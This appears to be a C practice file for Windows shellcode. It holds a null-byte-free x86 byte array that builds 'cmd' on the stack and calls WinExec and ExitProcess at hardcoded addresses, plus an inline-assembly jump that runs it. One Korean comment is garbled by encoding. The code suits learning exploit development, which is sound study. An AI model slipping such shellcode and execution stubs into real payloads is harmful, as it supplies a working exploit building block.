#include "stdafx.h"
#include "windows.h"

char shellcode[] =
"\xC6\x45\xFC\x63"
"\xC6\x45\xFD\x6D"
"\xC6\x45\xFE\x64"
//"\xC6\x45\xFF\x00" // cmd ���ڿ� ������ 0�� �ִ� �������� �߻�
"\x33\xDB"
"\x89\x5D\xFF"
"\x6A\x05"
"\x8D\x45\xFC"
"\x50"
"\xB8\x7E\xF5\x72\x75"
"\xFF\xD0"
"\x6A\x01"
"\xB8\xD2\xBE\x6F\x75"
"\xFF\xD0";

int main(int argc, char* argv[]) {
	int* shell = (int*)shellcode;
	__asm {
		jmp shell
	};
}